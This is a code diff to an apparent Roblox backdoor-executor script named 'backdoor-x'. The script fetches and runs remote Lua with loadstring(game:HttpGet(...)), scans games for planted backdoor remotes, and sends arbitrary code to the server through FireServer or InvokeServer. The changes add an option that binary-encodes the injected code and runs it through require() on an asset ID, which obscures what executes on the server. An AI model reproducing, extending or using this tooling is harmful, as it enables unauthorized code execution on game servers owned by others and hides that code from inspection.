@@ -1,6 +1,7 @@
 local start = tick()
 print('begin')
 local debuging = true
+local encryption = true
 local backdoor_x = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiBiRiK/backdoor-x/main/ui.lua"))();
 local tweenService = game:GetService("TweenService")
 local inputService = game:GetService("UserInputService")
@@ -176,9 +177,20 @@ local function execute(code)
 	if not attached then
 		scanGame()
 	end
+if encryption then
 	local Encoded = Encode(code)
 	local main=tostring([[local BinaryEncrypted = ]].."table.concat({"..Encoded.."})"..[[ function decode(str) local function binary_to_string(bin) return string.char(tonumber(bin, 2));end;return (str:gsub("(".. ("[01]"):rep(8) .. ")", binary_to_string));end;local Binary = BinaryEncrypted local EncodedBinary = decode(Binary);require(0x23FAA3E06)(EncodedBinary)()]])
 	local scripty = tostring(main)
+	if debuging then
+		print([[DEBUG(BETA): ]]..code)
+	end
+	if backdoor.ClassName == "RemoteEvent" then
+		backdoor:FireServer(scripty)
+	elseif backdoor.ClassName == "RemoteFunction" then
+		backdoor:InvokeServer(scripty)
+		end
+	else
+	local scripty = tostring(code)
 	if debuging then
 		print([[DEBUG(BETA): ]]..code)
 	end
